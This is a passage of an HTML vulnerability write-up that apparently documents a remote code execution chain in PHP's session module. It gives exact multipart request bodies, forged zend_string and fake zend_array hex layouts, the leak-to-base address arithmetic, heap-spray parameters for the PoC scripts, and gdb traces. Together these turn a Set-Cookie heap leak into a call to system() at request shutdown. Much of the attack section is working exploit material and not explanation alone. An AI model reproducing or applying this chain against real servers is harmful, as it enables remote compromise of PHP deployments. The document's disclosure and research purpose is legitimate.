+          <pre><code><span class="c"># same heap slot, two requests. A1: real id. B1: forged length.</span>
+A1  [url_encode] len=<span class="k">0x20 (32)</span>      data@0x7f56d1337018 first=fd0a9543
+B1  [url_encode] len=<span class="big">0xc8000 (819200)</span> data@0x7f56d1337018 first=<span class="big">/14BBBBB</span>
+<span class="c"># cross-check: python libphp 0x7f56d3647000 + nm php_url_encode 0x4bc590</span>
+<span class="c">#            = 0x7f56d3b03590  == gdb breakpoint address. leak math is correct.</span></code></pre>
+        </div>
+        <div class="note"><span class="lbl">how much can leak</span>The length is a forged 64-bit <code>size_t</code> — the primitive has no cap. A single read is bounded by the first unmapped page: from the header at page <code>0x137</code> there are <code>0xC8FE8</code> (~823KB) to the end of that 2&nbsp;MiB chunk, so <code>0xC8000</code> fits and <code>0xD0000</code> crosses into the next (unmapped) chunk and SIGSEGVs. Move the header to page 1 → ~2&nbsp;MiB in one read; grooming can map neighbouring chunks contiguously for several MB; the encoder itself allocates up to 3× the length, so one read tops out near ~45&nbsp;MB under the 128M limit. Across requests on the same worker you can sweep without limit.</div>
+      </div>
+    </div>
+    <figure>
+      <div class="diagram">
+        <svg class="sd" viewBox="0 0 900 326" role="img" aria-label="B1: grooming values reclaim the id chunk and plant a forged zend_string where PS(id) dangles; the cookie encode reads 0xC8000 bytes out of bounds across the chunk and a hole full of real arrays, returning heap and libphp pointers in Set-Cookie.">
+          <rect class="box" x="16" y="14" width="600" height="46" rx="6"/>
+          <text class="n" x="28" y="34">POST /index.php  ·  chunked multipart</text>
+          <text class="s" x="28" y="50">G:511×14 · G:400 · X:900 · fake-len 0xC8000</text>
+          <text class="n ca" x="16" y="88">ACCESS: send_cookie → php_url_encode reads 0xC8000 B from PS(id)</text>
+          <path class="arra" d="M544 102 V94 H869 V102"/>
+          <rect class="ba" x="18" y="106" width="677" height="40"/>
+          <text class="n" x="356" y="130" text-anchor="middle">G:400 — 'A' fill (pages 1..400)</text>
+          <rect class="bg2" x="695" y="106" width="189" height="40"/>
+          <text class="s cg" x="789" y="124" text-anchor="middle">111-page hole</text>
+          <text class="s" x="789" y="138" text-anchor="middle">→ X:900 real arrays</text>
+          <line x1="544" y1="100" x2="544" y2="150" style="stroke:var(--fault);stroke-width:2"/>
+          <text class="s cm" x="18" y="164">chunk base (2 MiB-aligned)</text>
+          <text class="s cm" x="884" y="164" text-anchor="end">page 0x1ff (511)</text>
+          <text class="s cg" x="789" y="184" text-anchor="middle">real HashTable pDestructor = zval_ptr_dtor</text>
+          <text class="s cg" x="789" y="198" text-anchor="middle">→ libphp = ptr − 0x65EB60</text>
+          <rect class="ba" x="444" y="200" width="200" height="30" rx="4"/>
+          <text class="n" x="544" y="219" text-anchor="middle">PS(id) — stale from A1</text>
+          <path class="arrr" d="M544 200 V152"/><polygon class="cd" points="544,150 539,158 549,158"/>
+          <text class="s cd" x="544" y="246" text-anchor="middle">now overlays forged zend_string @0x137 (len 0xC8000, rc 0, data '/')</text>
+          <rect class="box" x="16" y="262" width="600" height="46" rx="6"/>
+          <text class="n ca" x="28" y="282">Set-Cookie: PHPSESSID = &lt;819,208 bytes of heap&gt;</text>
+          <text class="s" x="28" y="298">decode_cookie → id-chunk base + libphp + main chunk (ASLR defeated)</text>
+          <path class="arr" d="M632 285 H690"/><polygon class="cm" points="698,285 690,280 690,290"/>
+          <text class="s" x="706" y="282">to attacker</text>
+          <text class="s" x="706" y="296">(≈1.5–2.3 MB)</text>
+        </svg>
+      </div>
+      <figcaption><b>stage B1</b> · the <code>G</code> values reclaim the pages <code>PS(id)</code> dangled into; one forged length turns the cookie into an 800KB out-of-bounds read.</figcaption>
+    </figure>
+    <h4 style="margin:24px 0 6px;font-size:14px;font-weight:600">B1 on the wire — one <code>G</code> value (large page-run that reclaims the id chunk)</h4>
+    <pre><code>--CCCCCCCCCC
+Content-Disposition: form-data; name="f0000ff…ff"   <span class="c-com"># 120-byte name</span>
+
+AAAA … AAAA   <span class="c-com"># ~511 pages of 'A' (fills a whole 2 MiB chunk)</span>
+              <span class="c-com"># with a forged zend_string header written at page 0x137 ↓</span></code></pre>
+    <h4 style="margin:18px 0 6px;font-size:14px;font-weight:600">B1 in memory — the forged <code>zend_string</code> the stale <code>PS(id)</code> now reads</h4>
+    <pre><code>+0x00  00 00 00 00                 gc.refcount   = 0        <span class="c-com"># release never frees it</span>
++0x04  16 00 00 00                 gc.u.type_info = 0x16    <span class="c-com"># IS_STRING | persistent</span>
++0x08  00 00 00 00 00 00 00 00     h   = 0
++0x10  00 80 0c 00 00 00 00 00     len = 0x000C8000 = 819200  <span class="c-f"># ← forged length</span>
++0x18  2f 31 34 42 42 42 42 42     val = "/14BBBBB"          <span class="c-com"># '/' → valid_key fails (after cookie sent)</span></code></pre>
+    <p style="font-size:12.5px;color:var(--muted);margin-top:-6px"><code>php_url_encode(ZSTR_VAL, ZSTR_LEN)</code> reads <code>len</code> = 0xC8000 bytes from <code>val</code> → the 800KB OOB read. Matches the gdb trace's <code>len=0xc8000 … first=/14BBBBB</code>.</p>
+  </section>
+
+  <!-- ===== Stage A2 + B2 ===== -->
+  <section>
+    <p class="snum">04 — Stage A2 + B2</p>
+    <h2>A2 + B2 — strand a pointer, reclaim it, reach <code>system()</code></h2>
+    <h3>First: turning the B1 leak into the addresses B2 needs</h3>
+    <p>B2 can't hard-code addresses — ASLR randomises them each container start. Every concrete number comes from the B1 <code>Set-Cookie</code>. Below is a real capture from one run (single worker, port 18140): the <strong>33 MB</strong> chunked B1 body returned a <strong>1,652,625-byte</strong> response whose cookie decodes to <strong>819,208 bytes</strong> of heap.</p>
+    <h4 style="margin:20px 0 6px;font-size:14px;font-weight:600">1 · the raw <code>Set-Cookie</code> from the server (url-encoded)</h4>
+    <pre><code>Set-Cookie: PHPSESSID=%2F14BBBBBAAAAAAAAAAAAAAAAAAAAAAAAAA…   <span class="c-com"># %2F='/', forged tag, then 'A' fill + leaked pointers</span></code></pre>
+    <h4 style="margin:18px 0 6px;font-size:14px;font-weight:600">2 · <code>decode_cookie.py</code> — url-decode, read LE qwords, cluster 0x7f… pointers by 2 MiB</h4>
+    <pre><code>decoded=819208  head=b'/14BBBBBAAAAAAAA'  clusters=4  ptrs=8756
+  0x7f71fd600000 : 7495     <span class="c-com"># id chunk (mostly chunk-internal pointers)</span>
+  0x7f71ffe00000 : 1095     <span class="c-com"># zval_ptr_dtor cluster → libphp</span>
+  0x7f71fdc00000 :   87     <span class="c-f"># main chunk (the stable 87-count fingerprint)</span>
+  0x7f71fd400000 :   79     <span class="c-com"># neighbour chunk</span></code></pre>
+    <h4 style="margin:18px 0 6px;font-size:14px;font-weight:600">3 · extract the two bases (<code>exploit.py :: parse_leak</code>)</h4>
+    <pre><code>zval_ptr_dtor = 0x7f71fff22b60     <span class="c-com"># most-common single pointer in the window</span>
+libphp        = 0x7f71ff8c4000     <span class="c-com"># = zval_ptr_dtor − 0x65EB60</span>
+main chunk    = 0x7f71fdc00000     <span class="c-com"># the ~87 cluster</span>
+sanity        : libphp − main = 0x1cc4000   <span class="c-com"># must be 0x1A00000..0x1F00000, else re-leak</span>
+──────────────────────────────────────────────────────────
+S   = main   + 0xF8398  = 0x7f71fdcf8398    <span class="c-f"># → fake_ref_b --ht-addr S · mk_ht.py S …</span>
+zif = libphp + 0x465370 = 0x7f71ffd29370    <span class="c-f"># → mk_ht.py … zif  (pDestructor)</span></code></pre>
+    <p style="font-size:13.5px;color:var(--muted)">Those two values are exactly the <code>S</code> and <code>zif_system</code> the B2 structs below are built with. One <code>Set-Cookie</code> defeats ASLR: every pointer in the fake array is a valid runtime address derived from this response. (The <code>ptr→S</code> and <code>pDestructor→zif_system</code> in the B2 hex above are the same two numbers from a different run's ASLR.)</p>
+    <h3>What <code>hsv</code> is, and why destroying it runs a command</h3>
+    <p><code>hsv</code> is the PoC's name for <code>PS(http_session_vars)</code> (<span class="src">php_session.h:188</span>) — the session module's own zval that holds <code>$_SESSION</code>. When a session initialises, PHP wraps the <code>$_SESSION</code> array in a reference, parks it here, and registers it in the symbol table as the <code>$_SESSION</code> superglobal:</p>
+    <pre><code>ZVAL_NEW_REF(&amp;PS(http_session_vars), &amp;session_vars);   <span class="c-com"># reference → the $_SESSION array</span>
+Z_ADDREF_P(&amp;PS(http_session_vars));
+zend_hash_update_ind(&amp;EG(symbol_table), "_SESSION", &amp;PS(http_session_vars));   <span class="c-com"># session.c:248–250</span></code></pre>
+    <p>Every <code>$_SESSION</code> access the module makes goes through it — <code>Z_REFVAL(PS(http_session_vars))</code> in <code>php_set_session_var</code>, <code>php_check_cancel_upload</code>, the write-back encoder. It exists so the module can reach <code>$_SESSION</code> for the life of the request. Nothing exotic — it is ordinary session plumbing.</p>
+    <p><strong>What makes it the target is how PHP tears it down.</strong> At the end of every request, session RSHUTDOWN destroys that reference:</p>
+    <pre><code>php_rshutdown_session_globals():
+    if (!Z_ISUNDEF(PS(http_session_vars))) {
+        zval_ptr_dtor(&amp;PS(http_session_vars));   <span class="c-f"># session.c:140  ← the operation B2 hijacks</span>
+        ZVAL_UNDEF(&amp;PS(http_session_vars));
+    }</code></pre>
+    <p>Normally that drops the reference, the <code>$_SESSION</code> array's refcount reaches 0, and <code>zend_array_destroy</code> frees it cleanly. The exploit makes <code>hsv</code> instead point at a <strong>fake</strong> reference → the fake <code>zend_array</code> at <code>S</code> whose <code>pDestructor = zif_system</code>. So the routine "free <code>$_SESSION</code>" at shutdown becomes "call <code>zif_system</code>":</p>
+    <pre><code>zval_ptr_dtor(hsv) → drop reference → array refcount 0
+  → zend_array_destroy(S) → for its 1 bucket: pDestructor(&amp;arData[0])
+  → zif_system( S+0x20 )        <span class="c-com"># mk_ht lays a fake zend_execute_data at arData = S+0x20</span>
+  → reads num_args=1, arg1 = S+0x80 = "id&gt;/out/p1"
+  → system("id&gt;/out/p1")</code></pre>
+    <p>So <strong>A2</strong> frees/strands the memory <code>hsv</code>'s reference points at, and <strong>B2</strong>'s spray reclaims that freed slot with the fake reference and plants the fake array at <code>S</code>. When the pinned worker reaches RSHUTDOWN, the normal <code>$_SESSION</code> cleanup fires the attacker's destructor instead. It is the same 109618→109619 pattern as A1→B1, one layer up: a controlled OOM frees an object the module will still destroy, and the reclaim decides what that destruction does. The gdb trace's <code>popen("id&gt;/out/p1")</code> happens exactly here, at shutdown.</p>
+    <div class="step">
+      <div class="head"><span class="badge fault">A2</span><h3>cheap OOM strands a second pointer</h3><span class="verdict">CVE-2026-109618</span></div>
+      <div class="inner">
+        <dl class="kv">
+          <dt>Data</dt><dd><code>cheap_oom_a.py --parts 880 --depth 64 --fillers 115</code> — nested fields sized to OOM early, with fillers that shift the stranded pointer to a known slot.</dd>
+          <dt>From → to</dt><dd>parser → session callback → OOM <code>longjmp</code> before reset, same as A1 but tuned to strand a different global.</dd>
+          <dt>Processed by</dt><dd><span class="sym">rfc1867</span> parser → OOM → <code>longjmp</code>.</dd>
+          <dt>Process / mem state</dt><dd>Leaves the PoC's <code>hsv</code> pointer (its label for a session-module pointer; the real serializer slot is <code>PS(serializer)</code>) dangling into the heap at <code>main+0x7D720</code>. This is the write target B2 reclaims.</dd>
+          <dt>Bug</dt><dd><strong>CVE-2026-109618</strong> again — a second controlled OOM, a second stranded pointer.</dd>
+        </dl>
+      </div>
+    </div>
+    <div class="step">
+      <div class="head"><span class="badge exec">B2</span><h3>fake reference + fake array → destructor is <code>system</code></h3><span class="verdict">UAF reclaim → RCE</span></div>
+      <div class="inner">
+        <dl class="kv">
+          <dt>Data</dt><dd><code>fake_ref_b.py --vl 384 --n1 500 --n2 495 --rc 1 --ht-addr S --ht-file ht</code> sprays 384-byte values holding a fake <code>zend_reference</code> every 32 bytes (<code>rc=1</code>, <code>IS_REFERENCE</code>, <code>ptr=S</code>), plus an <code>ht</code> field = the fake <code>zend_array</code> from <code>mk_ht.py</code>.</dd>
+          <dt>From → to</dt><dd>the spray reclaims the freed slot <code>hsv</code> points at, so <code>hsv</code> → a fake reference whose <code>ptr = S = main+0xF8398</code>; the <code>ht</code> field places the fake array at <code>S</code>.</dd>
+          <dt>Processed by</dt><dd>request shutdown walks the stranded reference → the fake array at <code>S</code> → <span class="sym">zend_hash_destroy</span> calls its <code>pDestructor</code>, which the attacker set to <code>zif_system</code> (<code>libphp+0x465370</code>), over a bucket whose value is the command string → <code>system("id&gt;/out/p1")</code>.</dd>
+          <dt>Process / mem state</dt><dd>
+            <div class="state"><span class="c"># fake zend_array carrier (mk_ht.py), offsets within the 384B value:</span>
++0x00 gc        = rc 1, <span class="a">IS_ARRAY</span>
++0x10 arData    = S+0x20
++0x30 <span class="d">pDestructor = zif_system (libphp+0x465370)</span>
++0x80 zend_string = "id&gt;/out/p1"</div></dd>
+          <dt>Bug</dt><dd><strong>CVE-2026-109618</strong> stranded the pointer (A2); the reclaim is a classic <strong>use-after-free / type confusion</strong> — the freed slot now holds attacker bytes shaped like a callable, and a later dereference calls it.</dd>
+        </dl>
+        <div class="verified">
+          <div class="vh">verified in gdb — breakpoint on popen (php_exec)</div>
+          <pre><code>[longjmp] zend bailout (OOM/abort path)   <span class="c"># ×3 — A2's OOM</span>
+<span class="k">[popen] cmd=id&gt;/out/p1</span>                   <span class="c"># B2 reached the shell</span>
+[Detaching after vfork from child process 417]
+Program received signal SIGSEGV in <span class="k">php_exec</span> @ libphp+0x464f6c
+<span class="c"># php_exec sits 0x404 below zif_system (libphp+0x465370): the system()</span>
+<span class="c"># handler ran the command, then this untuned single-worker run crashed.</span></code></pre>
+        </div>
+        <div class="note"><span class="lbl">honest note</span>In this single-worker trace the worker SIGSEGV'd in <code>php_exec</code> <em>after</em> the command executed (proof file written). The pinned/official runs are cleaner — the child survives — which is why the chain is reliable (§09).</div>
+      </div>
+    </div>
+    <figure>
+      <div class="diagram">
+        <svg class="sd" viewBox="0 0 900 176" role="img" aria-label="A2: a cheap OOM longjmp strands the hsv serializer pointer into a freed slot at main+0x7D720.">
+          <rect class="box" x="16" y="14" width="560" height="46" rx="6"/>
+          <text class="n" x="28" y="34">POST /index.php  ·  multipart (cheap OOM)</text>
+          <text class="s" x="28" y="50">880 depth-64 nested · 115 fillers</text>
+          <text class="s" x="16" y="80">processed by:  rfc1867 parser → callback → alloc crosses memory_limit → longjmp ×3 (skips reset)</text>
+          <rect class="lane" x="16" y="92" width="868" height="60" rx="8"/>
+          <rect class="bd" x="560" y="104" width="300" height="34" rx="4"/>
+          <text class="n" x="572" y="120">hsv's referent ($_SESSION ref)</text>
+          <text class="s" x="572" y="134">@ main+0x7D720</text>
+          <text x="844" y="128" style="font-size:18px;fill:var(--fault)">×</text>
+          <rect class="ba" x="32" y="109" width="150" height="30" rx="4"/><text class="s" x="107" y="128" text-anchor="middle">hsv = http_session_vars</text>
+          <path class="arrd" d="M182 124 C 360 124, 440 123, 558 123"/><polygon class="cd" points="560,123 552,118 552,128"/>
+          <text class="s cm" x="620" y="150" text-anchor="end">A2 strands hsv into a freed bin slot — B2's reclaim target</text>
+        </svg>
+      </div>
+      <figcaption><b>stage A2</b> · a second OOM strands <code>hsv</code> = <code>PS(http_session_vars)</code> (the module's <code>$_SESSION</code> reference) at <code>main+0x7D720</code>.</figcaption>
+    </figure>
+    <h4 style="margin:24px 0 6px;font-size:14px;font-weight:600">A2 on the wire — real multipart body (<code>cheap_oom_a.py --parts 880 --fillers 115</code>)</h4>
+    <pre><code>--CCCCCCCCCC
+Content-Disposition: form-data; name="PHPSESSID"
+
+a
+--CCCCCCCCCC
+Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"
+
+k0
+--CCCCCCCCCC
+Content-Disposition: form-data; name="000"
+
+x                                  <span class="c-com"># ×115 short fillers → shift the strand to a known slot</span>
+--CCCCCCCCCC
+Content-Disposition: form-data; name="files[R00000…][a]×62"; filename=""
+Content-Type: application/octet-stream
+
+                                   <span class="c-f"># empty body · ×880 nested parts → OOM longjmp</span>
+--CCCCCCCCCC--</code></pre>
+    <p style="font-size:12.5px;color:var(--muted);margin-top:-6px">Full body: <strong>279,338 bytes</strong>. Same multipart family as A1, tuned to OOM earlier; the 115 fillers move the stranded <code>hsv</code> pointer to a known bin slot (≈ +0x80 per filler).</p>
+    <figure>
+      <div class="diagram">
+        <svg class="sd" viewBox="0 0 900 326" role="img" aria-label="B2: a 384-byte spray reclaims the hsv slot via LIFO bin-448 reuse with a fake reference to S; a fake zend_array at S has pDestructor set to zif_system, so shutdown's zend_hash_destroy calls system with the command.">
+          <rect class="box" x="16" y="14" width="660" height="46" rx="6"/>
+          <text class="n" x="28" y="34">POST /index.php  ·  multipart spray</text>
+          <text class="s" x="28" y="50">n1=500 + n2=495 × 384B values · fake zend_reference every 32B (ptr=S) · ht field</text>
+          <rect class="ba" x="32" y="86" width="110" height="30" rx="4"/><text class="n" x="87" y="105" text-anchor="middle">hsv</text>
+          <path class="arrr" d="M142 101 H298"/><polygon class="cd" points="306,101 298,96 298,106"/>
+          <text class="s cm" x="150" y="80">LIFO bin-448 reuse</text>
+          <rect class="bd" x="306" y="84" width="260" height="40"/>
+          <text class="n" x="318" y="102">fake zend_reference</text>
+          <text class="s" x="318" y="117">rc=1 · IS_REFERENCE · ptr=S</text>
+          <text class="s cm" x="32" y="140">384B → bin-448; the spray lands on hsv's freed slot (most-recently-freed reused first)</text>
+          <path class="arrr" d="M436 124 V166"/><polygon class="cd" points="436,168 431,160 441,160"/>
+          <rect class="bd" x="300" y="170" width="430" height="92"/>
+          <text class="n cd" x="312" y="190">fake zend_array @ S = main+0xF8398</text>
+          <text class="s cd" x="312" y="208">+0x30 pDestructor = zif_system (libphp+0x465370)</text>
+          <text class="s" x="312" y="224">+0x10 arData → bucket</text>
+          <text class="s" x="312" y="240">bucket zval → zend_string "id&gt;/out/p1"</text>
+          <text class="n" x="16" y="292">shutdown → zend_hash_destroy(S) → pDestructor()</text>
+          <path class="arrr" d="M352 288 H404"/><polygon class="cd" points="412,288 404,283 404,293"/>
+          <rect class="bd" x="416" y="276" width="190" height="26" rx="4"/><text class="n cd" x="511" y="293" text-anchor="middle">system("id&gt;/out/p1")</text>
+          <path class="arr" d="M606 288 H648"/><polygon class="cm" points="656,288 648,283 648,293"/>
+          <text class="n cg" x="664" y="292">uid=33(www-data)</text>
+        </svg>
+      </div>
+      <figcaption><b>stage B2</b> · LIFO reclaim turns <code>hsv</code> into a reference to a fake array whose destructor is <code>system</code>; shutdown fires it.</figcaption>
+    </figure>
+    <h4 style="margin:24px 0 6px;font-size:14px;font-weight:600">B2 on the wire — real multipart body (<code>fake_ref_b.py --vl 384 --n1 500 --n2 495</code>)</h4>
+    <pre><code>--CCCCCCCCCC
+Content-Disposition: form-data; name="s000000000"
+
+SSSSSSSS……(384 binary bytes)       <span class="c-com"># 'S' padding + a fake zend_reference every 32 B</span>
+                                   <span class="c-com"># first 32 B of the value:</span>
+   53 53 53 53 53 53 53 53  01 00 00 00 0a 00 00 00
+   98 83 af d1 56 7f 00 00  07 01 00 00 00 00 00 00   <span class="c-f"># ← ptr = S at offset +8</span>
+--CCCCCCCCCC                        <span class="c-com"># ×995 spray parts (500 before ht, 495 after)</span>
+Content-Disposition: form-data; name="ht"
+
+……(384 binary bytes)               <span class="c-f"># = the fake zend_array (memory layout below)</span>
+--CCCCCCCCCC
+Content-Disposition: form-data; name="PHPSESSID"
+
+aaaa……(32)
+--CCCCCCCCCC
+Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"
+
+k0
+--CCCCCCCCCC--</code></pre>
+    <p style="font-size:12.5px;color:var(--muted);margin-top:-6px">Full body: <strong>451,384 bytes</strong>, 995 spray parts. The spray's job is to reclaim the A2-stranded slot; the one <code>ht</code> field carries the fake array.</p>
+    <h4 style="margin:24px 0 6px;font-size:14px;font-weight:600">B2 in memory — fake <code>zend_reference</code> (repeats every 32 B in each 384-B spray value → bin-448)</h4>
+    <pre><code>+0x00  01 00 00 00                 gc.refcount = 1
++0x04  0a 00 00 00                 type = 0x0A              <span class="c-com"># IS_REFERENCE</span>
++0x08  98 83 af d1 56 7f 00 00     ptr → 0x7f56d1af8398     <span class="c-f"># = S (the fake array)</span>
++0x10  07 01 00 00                 val.u1.type_info = 0x0107</code></pre>
+    <h4 style="margin:18px 0 6px;font-size:14px;font-weight:600">B2 in memory — fake <code>zend_array</code> at <code>S</code> (<code>mk_ht.py</code>)</h4>
+    <pre><code>+0x00  01 00 00 00 07 00 00 00     gc: refcount=1, type = IS_ARRAY (7)
++0x08  10 00 00 00 f8 ff ff ff     u.flags / nTableMask
++0x10  b8 83 af d1 56 7f 00 00     arData → 0x7f56d1af83b8  <span class="c-com"># = S+0x20</span>
++0x18  01 00 00 00 01 00 00 00     nNumUsed = 1 / nNumOfElements = 1
++0x30  70 c3 aa d3 56 7f 00 00     pDestructor → 0x7f56d3aac370  <span class="c-f"># = zif_system ← the hijack</span>
++0x80  01 00 00 00 06 01 00 00     fake zend_string: refcount=1, IS_STRING
++0x90  0a 00 00 00 00 00 00 00     len = 10
++0x98  69 64 3e 2f 6f 75 74 2f 70 31   "id&gt;/out/p1"</code></pre>
+    <p style="font-size:12.5px;color:var(--muted);margin-top:-6px">At shutdown <code>zend_hash_destroy(S)</code> calls <code>pDestructor</code> (<code>+0x30</code>) over the bucket at <code>arData</code>, whose value is the command string → <code>system("id&gt;/out/p1")</code>.</p>
+  </section>
+
+  <!-- ===== 05 ZendMM model ===== -->
+  <section>
+    <p class="snum">05 — Inside ZendMM</p>
+    <h2>The memory model the whole chain stands on</h2>
+    <p>Request data never touches <code>malloc</code> directly — it goes through the Zend Memory Manager (ZendMM, <span class="src">Zend/zend_alloc.c</span>), an arena over <code>mmap</code>. Three facts decide everything that follows.</p>
+    <figure>
+      <div class="diagram">
+        <svg viewBox="0 0 920 150" role="img" aria-label="A 2 MiB ZendMM chunk split into 512 pages, with page 0 as header and the rest carved into small-bin runs (SRUN), a large run (LRUN) and free pages (FRUN).">
+          <text x="16" y="22" style="font:600 13px var(--sans);fill:var(--fg)">One 2 MiB chunk — mmap, 2 MiB-aligned · 512 × 4 KiB pages</text>
+          <!-- bar -->
+          <rect x="16" y="40" width="26" height="46" style="fill:var(--surface-2);stroke:var(--border-strong)"/>
+          <rect x="42" y="40" width="150" height="46" style="fill:var(--surface-2);stroke:var(--accent)"/>
+          <rect x="192" y="40" width="120" height="46" style="fill:var(--surface-2);stroke:var(--accent)"/>
+          <rect x="312" y="40" width="250" height="46" style="fill:var(--surface-2);stroke:var(--warn)"/>
+          <rect x="562" y="40" width="198" height="46" style="fill:none;stroke:var(--border-strong);stroke-dasharray:4 3"/>
+          <rect x="760" y="40" width="144" height="46" style="fill:var(--surface-2);stroke:var(--accent)"/>
+          <!-- labels -->
+          <text x="29" y="68" style="font:11px var(--mono);fill:var(--muted);text-anchor:middle">pg0</text>
+          <text x="117" y="63" style="font:11px var(--mono);fill:var(--accent);text-anchor:middle">SRUN</text>
+          <text x="117" y="77" style="font:10px var(--mono);fill:var(--muted);text-anchor:middle">bin-40</text>
+          <text x="252" y="63" style="font:11px var(--mono);fill:var(--accent);text-anchor:middle">SRUN</text>
+          <text x="252" y="77" style="font:10px var(--mono);fill:var(--muted);text-anchor:middle">bin-64</text>
+          <text x="437" y="63" style="font:11px var(--mono);fill:var(--warn);text-anchor:middle">LRUN · large</text>
+          <text x="437" y="77" style="font:10px var(--mono);fill:var(--muted);text-anchor:middle">whole pages</text>
+          <text x="661" y="63" style="font:11px var(--mono);fill:var(--muted);text-anchor:middle">FRUN · free</text>
+          <text x="832" y="63" style="font:11px var(--mono);fill:var(--accent);text-anchor:middle">SRUN</text>
+          <text x="832" y="77" style="font:10px var(--mono);fill:var(--muted);text-anchor:middle">bin-448</text>
+          <!-- ticks -->
+          <text x="16" y="104" style="font:10px var(--mono);fill:var(--muted)">page 0 (header)</text>
+          <text x="904" y="104" style="font:10px var(--mono);fill:var(--muted);text-anchor:end">page 511</text>
+          <text x="16" y="128" style="font:11px var(--mono);fill:var(--fg)">any pointer &amp; ~0x1FFFFF → its chunk base  (why leaked pointers cluster by 2 MiB)</text>
+        </svg>
+      </div>
+      <figcaption><b>fig A</b> · the ZendMM chunk: header page, small-bin runs (SRUN), large page-runs (LRUN), free pages (FRUN).</figcaption>
+    </figure>
+    <ul>
+      <li><strong>Chunks &amp; pages.</strong> Memory is carved from 2 MiB chunks, each <code>mmap</code>'d <strong>2 MiB-aligned</strong> (<span class="src">zend_alloc_sizes.h:22</span>), split into <strong>512 × 4 KiB pages</strong>; page 0 is the chunk header.</li>
+      <li><strong>Three size regimes.</strong> <code>small ≤ 3072 B</code> → one of <strong>30 fixed bins</strong> (8, 16, 24, … 3072; <span class="src">zend_alloc_sizes.h:32</span>); <code>large 3073 B … ~2 MiB</code> → a run of whole pages; <code>huge &gt; 2 MiB</code> → its own <code>mmap</code>.</li>
+      <li><strong>Alignment is addressing.</strong> Because chunks are 2 MiB-aligned, <code>ptr &amp; ~0x1FFFFF</code> is its chunk base — exactly how <code>decode_cookie</code> turns leaked 8-byte values into base addresses (§03).</li>
+    </ul>
+    <div class="tbox">
+      <table>
+        <caption>the bins the exploit uses (of 30)</caption>
+        <thead><tr><th>Bin</th><th>Slot size</th><th>Holds in this chain</th></tr></thead>
+        <tbody>
+          <tr><td class="mono">#3</td><td class="mono">32 B</td><td>short field-name keys (<code>fake_ref_b --name-len 3</code>)</td></tr>
+          <tr><td class="mono">#4</td><td class="mono">40 B</td><td><code>ps_files</code> = <code>PS(mod_data)</code>; <code>zend_llist_element</code>; name-len 10</td></tr>
+          <tr><td class="mono">#7</td><td class="mono">64 B</td><td>the session-id <code>zend_string</code> = <code>PS(id)</code></td></tr>
+          <tr><td class="mono">#18</td><td class="mono">448 B</td><td>the 384-byte B2 spray values (fake references + <code>ht</code>)</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- ===== 06 why UAF ===== -->
+  <section>
+    <p class="snum">06 — Mechanism</p>
+    <h2>Why this layout produces a use-after-free</h2>
+    <p>Two allocator disciplines — both confirmed in the 8.4.26 source — make a freed object's <em>successor</em> predictable. That predictability is the whole basis of grooming.</p>
+    <div class="cols">
+      <div class="card">
+        <span class="lbl" style="color:var(--accent)">small bins</span>
+        <h4>LIFO free-list → MRU reuse</h4>
+        <p style="font-size:13.5px;margin:0"><code>free_small</code> pushes the freed slot to <code>free_slot[bin]</code>'s head; <code>alloc_small</code> pops the head (<span class="src">zend_alloc.c:1417 / 1395</span>). <strong>The next allocation of that size lands on the slot you just freed.</strong> Free the victim, allocate your fake → same address.</p>
+      </div>
+      <div class="card">
+        <span class="lbl" style="color:var(--warn)">large runs</span>
+        <h4>Best-Fit over the page bitmap</h4>
+        <p style="font-size:13.5px;margin:0"><code>zend_mm_alloc_pages</code> scans a chunk's <code>free_map</code> for the <strong>smallest free run ≥ request</strong> (<span class="src">zend_alloc.c, "Best-Fit Search"</span>). A precisely-sized hole is filled by the next allocation that fits it → you place a chosen object at a chosen page.</p>
+      </div>
+    </div>
+    <p>Two more properties seal it: ZendMM <strong>never zeroes on free</strong>, and at request end it <strong>keeps its chunks</strong> (<code>cached_chunks</code>, <span class="src">zend_alloc.c:293</span>) and reuses them for the next request on the same worker. Freed bytes and freed-but-not-nulled pointers both persist. So a pointer that outlives its object — because a <code>longjmp</code> skipped the code that nulls it (§07) — now points at a slot or page the next request deterministically reclaims with attacker bytes. That is the UAF. It appears in two forms:</p>
+    <ul>
+      <li><strong>Cross-request</strong> (the main chain): <code>PS(id)</code> and the A2 pointer survive into the next request on the pinned worker; the grooming spray reclaims their targets.</li>
+      <li><strong>Intra-request</strong> (diagram 7): the callback caches raw <code>zval*</code> interior pointers into the progress array — <code>post_bytes_processed</code> / <code>current_file_bytes_processed</code> (<span class="src">session.c:3306, 3332</span>); <code>php_session_rfc1867_update</code> re-decodes and rebuilds that array (<code>zend_hash_update</code> → <code>zval_ptr_dtor</code> frees the old buckets, <span class="src">:3196–3204</span>), leaving those interior pointers dangling, and the next <code>FILE_DATA</code> event writes <em>through</em> them (<code>Z_LVAL_P(...) = ...</code>, <span class="src">:3334, 3345</span>).</li>
+    </ul>
+  </section>
+
+  <!-- ===== 07 trigger ===== -->
+  <section>
+    <p class="snum">07 — Mechanism</p>
+    <h2>What the OOM trigger actually does</h2>
+    <p><code>memory_limit</code> is enforced <em>inside</em> the allocator. When serving a request would push <code>heap-&gt;real_size</code> past <code>heap-&gt;limit</code> (128 MiB), <code>zend_mm_safe_error</code> fires (<span class="src">zend_alloc.c:1049 → 401</span>) → <code>zend_error_noreturn(E_ERROR)</code> → <code>zend_bailout</code> → <code>longjmp(EG(bailout))</code>.</p>
+    <dl class="kv">
+      <dt>Drive to the limit</dt><dd>The body (chunked, so <code>post_max_size</code> doesn't bound it) allocates aggressively — 860 depth-64 nested arrays, dozens of multi-KB values, a 4000-byte progress value — so <code>real_size</code> climbs to the 128 MiB ceiling. The PoC shapes it so the <em>crossing</em> allocation happens at a chosen moment: for A1, inside the END-cleanup cookie encode (<code>php_url_encode</code>); for A2, earlier (a "cheap" OOM).</dd>
+      <dt>What longjmp skips</dt><dd>It unwinds the C stack out of whatever was running — mid-callback, mid-cleanup — straight to the bailout handler, <strong>without running the tail of that code</strong>. The session code that would reset <code>PS(id)</code>/<code>PS(mod_data)</code> or free-and-null <code>PS(rfc1867_progress)</code> at <code>EVENT_END</code> never runs.</dd>
+      <dt>What ZendMM still does</dt><dd>Arena teardown reclaims the pages regardless. So the skipped reset + the reclaimed pages = <strong>a live pointer into reusable memory</strong> — the strand.</dd>
